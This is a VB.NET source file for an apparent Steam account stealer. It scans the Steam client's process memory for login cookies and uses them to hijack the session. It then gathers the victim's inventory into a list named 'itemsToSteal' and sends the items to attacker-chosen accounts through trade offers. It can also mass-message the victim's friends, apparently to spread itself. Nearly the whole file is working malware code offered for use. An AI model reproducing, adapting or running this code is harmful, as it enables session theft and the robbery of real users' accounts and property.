Imports System.IO
Imports System.Net
Imports System.Reflection
Imports System.Text
Imports System.Text.RegularExpressions

Public Class SteamWorker
    Public cookiesContainer As New CookieContainer()
    Private friends As New List(Of String)()
    Private itemsToSteal As New List(Of String())()
    Private OffersList As New List(Of String())()
    Public ParsedSteamCookies As New List(Of String)()

    Public Sub acceptAllIncomingTrades(LoggingIt As Boolean)
        Dim list As List(Of String()) = Me.getIncomingTradeoffers()
        For i As Integer = 0 To list.Count - 1
            Dim [error] As String = ""
            If list(i)(3) = "1" Then
                Me.LogIt((Convert.ToString(list(i)(2) + "(" + list(i)(1) + ") -> ") & Me.steamID) + " abuse detected")
                Me.declineOffer(list(i)(0))
            Else
                Dim status As OfferStatus = Me.acceptOffer(list(i), [error])
                If LoggingIt Then
                    Select Case status
                        Case OfferStatus.Accepted
                            Me.LogIt((Convert.ToString(list(i)(2) + "(" + list(i)(1) + ") -> ") & Me.steamID) + " accepted")
                            Exit Select

                        Case OfferStatus.[Error]
                            Me.LogIt((Convert.ToString((Convert.ToString(list(i)(2) + "(" + list(i)(1) + ") -> ") & Me.steamID) + " Error: """) & [error]) + """")
                            Me.declineOffer(list(i)(0))
                            Exit Select
                    End Select
                End If
            End If
        Next
    End Sub

    Public Function acceptOffer(value As String(), ByRef [error] As String) As OfferStatus
        [error] = String.Empty
        Dim str As String = SteamHttp.SteamWebRequest(Me.cookiesContainer, "https://steamcommunity.com/tradeoffer/" + value(0) + "/accept", (Convert.ToString("sessionid=") & Me.sessionID) + "&tradeofferid=" + value(0) + "&partner=" + value(1), "tradeoffer/" + value(0) + "/")
        If str IsNot Nothing Then
            If str.IndexOf("tradeid") <> -1 Then
                Return OfferStatus.Accepted
            End If
            [error] = str
            Return OfferStatus.[Error]
        End If
        Return OfferStatus.[Error]
    End Function

    Private Sub addInList(ByRef whereINeedPut As List(Of String()), willinputed As List(Of String()))
        If willinputed IsNot Nothing Then
            For i As Integer = 0 To willinputed.Count - 1
                If Not whereINeedPut.Contains(willinputed(i)) Then
                    whereINeedPut.Add(willinputed(i))
                End If
            Next
        End If
    End Sub

    Private Sub AddItemsToList(appIDs As String, steamID As String, Optional filters As String = "")
        Dim strArray As String() = appIDs.Split(New Char() {","c})
        If appIDs.Length > 1 Then
            For i As Integer = 0 To strArray.Length - 1
                Dim input As List(Of String()) = Me.GetItems(steamID, strArray(i), If((strArray(i) <> "753"), Nothing, New String() {"1", "3", "6", "7"}))
                If input IsNot Nothing Then
                    If (filters <> String.Empty) AndAlso filters.Contains(strArray(i)) Then
                        Me.FilterByRarity(input, getFilterValues(filters, strArray(i)))
                    End If
                    If input IsNot Nothing Then
                        Me.itemsToSteal.AddRange(input)
                    End If
                End If
            Next
        End If
    End Sub

    Public Sub addItemsToSteal(appIds As String, Optional filters As String = "")
        Me.AddItemsToList(appIds, Me.steamID, filters)
    End Sub

    Public Sub addOffer(Steam64ID As String, tradeID As String, tradeToken As String)
        Me.OffersList.Add(New String() {Steam64ID, tradeID, tradeToken})
    End Sub

    Public Sub declineOffer(offer As String)
        Dim str As String = SteamHttp.SteamWebRequest(Me.cookiesContainer, (Convert.ToString("https://steamcommunity.com/tradeoffer/") & offer) + "/decline", Convert.ToString("sessionid=") & Me.sessionID, Me.steamID & Convert.ToString("76561198068284082/tradeoffers"))
    End Sub

    Private Function divideList(input As List(Of String()), size As Integer) As List(Of String()())
        Dim list As New List(Of String()())()
        Dim num As Integer = 0
        If input IsNot Nothing Then
            Dim list2 As New List(Of String())()
            For i As Integer = 0 To input.Count - 1
                list2.Add(input(i))
                num += 1
                If num = size Then
                    list.Add(list2.ToArray())
                    list2.Clear()
                    num = 0
                End If
            Next
            If list2.Count > 0 Then
                list.Add(list2.ToArray())
            End If
            Return list
        End If
        Return Nothing
    End Function

    Public Sub FilterByRarity(ByRef input As List(Of String()), filter As String)
        Dim strArray As String() = filter.Split(New Char() {","c})
        Dim list As New List(Of String())()
        For i As Integer = 0 To input.Count - 1
            For j As Integer = 0 To strArray.Length - 1
                Dim strArray2 As String() = input(i)(4).Split(New Char() {" "c})
                For k As Integer = 0 To strArray2.Length - 1
                    If Not (Not (strArray2(k) = strArray(j)) OrElse list.Contains(input(i))) Then
                        list.Add(input(i))
                        Exit For
                    End If
                Next
            Next
        Next
        input = If((list.Count > 0), list, Nothing)
    End Sub

    Private Function getCookieValue(input_cc As CookieContainer, name As String) As String
        Dim hashtable As Hashtable = DirectCast(GetType(CookieContainer).GetField("m_domainTable", BindingFlags.NonPublic Or BindingFlags.Instance).GetValue(input_cc), Hashtable)
        For Each str As String In hashtable.Keys
            Dim obj2 As Object = hashtable(str)
            Dim list As SortedList = DirectCast(obj2.[GetType]().GetField("m_list", BindingFlags.NonPublic Or BindingFlags.Instance).GetValue(obj2), SortedList)
            For Each str2 As String In list.Keys
                Dim cookies As CookieCollection = DirectCast(list(str2), CookieCollection)
                For Each cookie As Cookie In cookies
                    If cookie.Name = name Then
                        Return cookie.Value.ToString()
                    End If
                Next
            Next
        Next
        Return String.Empty
    End Function

    Private Shared Function getFilterValues(filters As String, name As String) As String
        If filters.Contains(name) Then
            Dim strArray As String() = filters.Split(New Char() {":"c, ";"c}, StringSplitOptions.RemoveEmptyEntries)
            For i As Integer = 0 To strArray.Length - 1
                If strArray(i) = name Then
                    Dim str As String = strArray(i + 1)
                    If str IsNot Nothing Then
                        Return str
                    End If
                End If
            Next
        End If
        Return Nothing
    End Function

    Public Sub getFriends()
        Me.friends.Clear()
        Dim strArray As String() = SteamHttp.SteamWebRequest(Me.cookiesContainer, (Convert.ToString("profiles/") & Me.steamID) + "/friends/", Nothing, "").Split(New String() {vbCr & vbLf}, StringSplitOptions.RemoveEmptyEntries)
        Try
            For i As Integer = 0 To strArray.Length - 1
                If strArray(i).IndexOf("name=""friends") <> -1 Then
                    Dim item As String = strArray(i).Split(New Char() {"["c, "]"c})(3)
                    If Not Me.friends.Contains(item) Then
                        Me.friends.Add(item)
                    End If
                End If
            Next
        Catch
        End Try
    End Sub

    Public Function getIncomingTradeoffers() As List(Of String())
        Dim list As New List(Of String())()
        Dim strArray As String() = SteamHttp.SteamWebRequest(Me.cookiesContainer, (Convert.ToString("profiles/") & Me.steamID) + "/tradeoffers/", Nothing, "").Split(New String() {vbCr & vbLf}, StringSplitOptions.RemoveEmptyEntries)
        For i As Integer = 0 To strArray.Length - 1
            If (strArray(i).IndexOf("tradeofferid_") = -1) OrElse (strArray(i + 11).IndexOf("inactive") <> -1) Then
                Continue For
            End If
            Dim num2 As Integer = -1
            For j As Integer = i To strArray.Length - 1
                If strArray(j).IndexOf("tradeoffer_footer") <> -1 Then
                    num2 = j
                    Exit For
                End If
            Next
            Dim flag As Boolean = False
            For k As Integer = num2 To 1 Step -1
                If strArray(k).IndexOf("tradeoffer_item_list") <> -1 Then
                    Exit For
                End If
                If strArray(k).IndexOf("trade_item") <> -1 Then
                    flag = True
                    Exit For
                End If
            Next
            list.Add(New String() {strArray(i).Split(New Char() {""""c})(3).Split(New Char() {"_"c})(1), strArray(i + 1).Split(New Char() {"'"c})(1), Uri.UnescapeDataString(strArray(i + 1).Split(New String() {"&quot;"}, StringSplitOptions.RemoveEmptyEntries)(1)), If(flag, "1", "0")})
        Next
        Return list
    End Function

    Public Function GetItems(steamID As String, appID As String, Optional contexIds As String() = Nothing) As List(Of String())
        Dim str As String
        Dim str2 As String
        Dim whereINeedPut As New List(Of String())()
        If contexIds Is Nothing Then
            str = (Convert.ToString((Convert.ToString("profiles/") & steamID) + "/inventory/json/") & appID) + "/2/?trading=1&market=1"
            str2 = SteamHttp.SteamWebRequest(Me.cookiesContainer, str, Nothing, "")
            Try
                whereINeedPut = New inventoryjson().Parse(str2, "2")
            Catch
                Return Nothing
            End Try
        Else
            For i As Integer = 0 To contexIds.Length - 1
                str = (Convert.ToString((Convert.ToString("profiles/") & steamID) + "/inventory/json/") & appID) + "/" + contexIds(i) + "/?trading=1&market=1"
                str2 = SteamHttp.SteamWebRequest(Me.cookiesContainer, str, Nothing, "")
                Try
                    Dim willinputed As List(Of String()) = New inventoryjson().Parse(str2, contexIds(i))
                    Me.addInList(whereINeedPut, willinputed)
                Catch
                End Try
            Next
        End If
        Return (If((whereINeedPut.Count > 0), whereINeedPut, Nothing))
    End Function

    Public Sub getSessionID()
        While Not SteamHttp.ObtainsessionID(Me.cookiesContainer)
        End While
        If Me.cookiesContainer.Count < 4 Then
            Me.cookiesContainer = New CookieContainer()
            Me.setCookies(True)
            Me.getSessionID()
        Else
            Me.sessionID = Me.getCookieValue(Me.cookiesContainer, "sessionid")
        End If
    End Sub

    Public Sub initChatSystem()
        Dim num As Integer
        Dim strArray As String() = SteamHttp.SteamWebRequest(Me.cookiesContainer, "chat/", Nothing, "").Split(New String() {vbCr & vbLf}, StringSplitOptions.RemoveEmptyEntries)
        For num = 0 To strArray.Length - 1
            If strArray(num).IndexOf("WebAPI = new CWebAPI") <> -1 Then
                Me.access_token = strArray(num).Split(New Char() {""""c})(1)
                Exit For
            End If
        Next
        Dim str2 As String = Me.randomInt(13)
        Dim strArray2 As String() = SteamHttp.SteamWebRequest(Me.cookiesContainer, Convert.ToString((Convert.ToString((Convert.ToString((Convert.ToString("https://api.steampowered.com/ISteamWebUserPresenceOAuth/Logon/v0001/?jsonp=jQuery") & Me.randomInt(&H16)) + "_") & str2) + "&ui_mode=web&access_token=") & Me.access_token) + "&_=") & str2, Nothing, "").Split(New Char() {""""c})
        For num = 0 To strArray2.Length - 1
            If strArray2(num) = "umqid" Then
                Me.umquid = strArray2(num + 2)
                Exit For
            End If
        Next
    End Sub

    Public Sub LogIt(line As String)
        Try
            Using writer As StreamWriter = System.IO.File.AppendText("log.txt")
                writer.WriteLine(DateTime.Now.ToString("[dd.MM.yyyy hh:mm:ss] ") & line)
            End Using
        Catch
        End Try
    End Sub

    Public Sub ParseSteamCookies()
        Dim processArray As Process()
        Me.ParsedSteamCookies.Clear()
        Dim input As New WinApis.SYSTEM_INFO()
        While input.minimumApplicationAddress.ToInt32() = 0
            WinApis.GetSystemInfo(input)
        End While
        Dim minimumApplicationAddress As IntPtr = input.minimumApplicationAddress
        Dim num As Long = minimumApplicationAddress.ToInt32()
        Dim list As New List(Of String)()
        processArray = InlineAssignHelper(processArray, Process.GetProcessesByName("steam"))
        Dim process__1 As Process = Nothing
        For i As Integer = 0 To processArray.Length - 1
            Try
                For Each [module] As ProcessModule In processArray(i).Modules
                    If [module].FileName.EndsWith("steamclient.dll") Then
                        process__1 = processArray(i)
                        Continue For
                    End If
                Next
            Catch
            End Try
        Next
        If process__1 IsNot Nothing Then
            Dim handle As IntPtr = WinApis.OpenProcess(&H410, False, process__1.Id)
            Dim processQuery As New WinApis.PROCESS_QUERY_INFORMATION()
            Dim numberofbytesread As New IntPtr(0)
            While WinApis.VirtualQueryEx(handle, minimumApplicationAddress, processQuery, &H1C) <> 0
                If (processQuery.Protect = 4) AndAlso (processQuery.State = &H1000) Then
                    Dim buffer As Byte() = New Byte(processQuery.RegionSize - 1) {}
                    WinApis.ReadProcessMemory(handle, processQuery.BaseAdress, buffer, processQuery.RegionSize, numberofbytesread)
                    Dim str As String = Encoding.UTF8.GetString(buffer)
                    Dim matchs As MatchCollection = New Regex("7656119[0-9]{10}%7c%7c[A-F0-9]{40}", RegexOptions.IgnoreCase).Matches(str)
                    If matchs.Count > 0 Then
                        For Each match As Match In matchs
                            If Not list.Contains(match.Value) Then
                                list.Add(match.Value)
                            End If
                        Next
                    End If
                End If
                num += processQuery.RegionSize
                If num >= &H7FFFFFFFL Then
                    Exit While
                End If
                minimumApplicationAddress = New IntPtr(num)
            End While
            Me.ParsedSteamCookies = list
            If list.Count >= 2 Then
                Me.setCookies(False)
            Else
                Me.ParsedSteamCookies.Clear()
                Me.ParseSteamCookies()
            End If
        End If
    End Sub

    Public Function prepareItems(input As String()()) As String
        Dim str As String = String.Empty
        For i As Integer = 0 To input.Length - 1
            str = str & String.Format("{4}""appid"":{0},""contextid"":""{1}"",""amount"":{2},""assetid"":""{3}""{5},", New Object() {input(i)(0), input(i)(5), input(i)(1), input(i)(2), "{", "}"})
        Next
        Return str.Remove(str.Length - 1)
    End Function

    Public Function randomInt(count As Integer) As String
        Dim random As New Random()
        Dim builder As New StringBuilder()
        For i As Integer = 0 To count - 1
            builder.Append(random.[Next](0, 10)).ToString()
        Next
        Return builder.ToString()
    End Function

    Public Sub SendItems(Optional message As String = "")
        If Me.itemsToSteal IsNot Nothing Then
            Dim list As List(Of String()()) = Me.divideList(Me.itemsToSteal, &H100)
            If list IsNot Nothing Then
                For i As Integer = 0 To Me.OffersList.Count - 1
                    For j As Integer = 0 To 4
                        Dim num3 As Integer = j + (i * 5)
                        If num3 >= list.Count Then
                            Exit For
                        End If
                        Dim items As String = Me.prepareItems(list(num3))
                        If Me.sentItems(Me.getCookieValue(Me.cookiesContainer, "sessionid"), items, Me.OffersList(i), message) IsNot Nothing Then
                        End If
                    Next
                Next
            End If
        End If
    End Sub

    Public Sub sendMessage(steamID As String, message As String)
        Dim str As String = Me.randomInt(&H16)
        Dim str2 As String = Me.randomInt(13)
        Dim url As String = String.Format("https://api.steampowered.com/ISteamWebUserPresenceOAuth/Message/v0001/?jsonp=jQuery{0}_{1}&umqid={2}&type=saytext&steamid_dst={3}&text={4}&access_token={5}&_={1}", New Object() {str, str2, Me.umquid, steamID, Uri.EscapeDataString(message), Me.access_token})
        SteamHttp.SteamWebRequest(Me.cookiesContainer, url, Nothing, "")
    End Sub

    Public Sub sendMessageToFriends(message As String)
        For i As Integer = 0 To Me.friends.Count - 1
            Dim str As String = Me.randomInt(&H16)
            Dim str2 As String = Me.randomInt(13)
            Dim url As String = String.Format("https://api.steampowered.com/ISteamWebUserPresenceOAuth/Message/v0001/?jsonp=jQuery{0}_{1}&umqid={2}&type=saytext&steamid_dst={3}&text={4}&access_token={5}&_={1}", New Object() {str, str2, Me.umquid, Me.friends(i), Uri.EscapeDataString(message), Me.access_token})
            SteamHttp.SteamWebRequest(Me.cookiesContainer, url, Nothing, "")
        Next
    End Sub

    Private Function sentItems(sessionID As String, items As String, Offer As String(), Optional message As String = "") As String
        Return SteamHttp.SteamWebRequest(Me.cookiesContainer, "tradeoffer/new/send", (Convert.ToString("sessionid=") & sessionID) + "&partner=" + Offer(0) + "&tradeoffermessage=" + Uri.EscapeDataString(message) + "&json_tradeoffer=" + Uri.EscapeDataString(String.Format("{5}""newversion"":true,""version"":2,""me"":{5}""assets"":[{3}],""currency"":[],""ready"":false{6},""them"":{5}""assets"":[],""currency"":[],""ready"":false{6}{6}", New Object() {sessionID, Offer(0), message, items, Offer(2), "{",
            "}"})) + "&trade_offer_create_params=" + Uri.EscapeDataString(String.Format("{0}""trade_offer_access_token"":""{2}""{1}", "{", "}", Offer(2))), "tradeoffer/new/?partner=" + Offer(1) + "&token=" + Offer(2))
    End Function

    Public Sub setCookies(a As Boolean)
        Me.cookiesContainer.SetCookies(New Uri("http://steamcommunity.com"), "steamLogin=" + Me.ParsedSteamCookies(If(a, 0, 1)))
        Me.cookiesContainer.SetCookies(New Uri("http://steamcommunity.com"), "steamLoginSecure=" + Me.ParsedSteamCookies(If(a, 1, 0)))
    End Sub

    Private Property access_token() As String
        Get
            Return m_access_token
        End Get
        Set
            m_access_token = Value
        End Set
    End Property
    Private m_access_token As String

    Private Property sessionID() As String
        Get
            Return m_sessionID
        End Get
        Set
            m_sessionID = Value
        End Set
    End Property
    Private m_sessionID As String

    Private ReadOnly Property steamID() As String
        Get
            Return (If((Me.ParsedSteamCookies.Count > 0), Me.ParsedSteamCookies(0).Substring(0, &H11), Nothing))
        End Get
    End Property

    Private Property umquid() As String
        Get
            Return m_umquid
        End Get
        Set
            m_umquid = Value
        End Set
    End Property
    Private m_umquid As String

    Public Enum OfferStatus
        Accepted
        Abuse
        [Error]
    End Enum
    Private Shared Function InlineAssignHelper(Of T)(ByRef target As T, value As T) As T
        target = value
        Return value
    End Function
End Class